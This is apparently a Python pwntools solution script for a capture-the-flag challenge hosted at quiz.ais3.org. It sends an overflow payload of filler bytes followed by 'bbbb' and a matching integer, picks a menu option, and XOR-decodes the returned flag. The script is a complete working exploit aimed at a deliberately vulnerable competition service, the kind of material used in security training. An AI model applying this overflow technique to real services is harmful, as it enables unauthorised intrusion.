#!/usr/bin/env python

from pwn import *

host = "quiz.ais3.org"
port = 56746

r = remote(host, port)

r.recvuntil(': ')
payload = 'a' * 20 + 'b' * 4
r.sendline(payload)

r.recvuntil(': ')
payload = '1650614882'
r.sendline(payload)

r.recvuntil(':')
r.recvuntil(':')
r.sendline('1')

r.recvuntil(': ')
flag = r.recvline()
print repr("".join([chr(ord('b') ^ ord(flag[i])) for i in range(len(flag))]))

r.interactive()
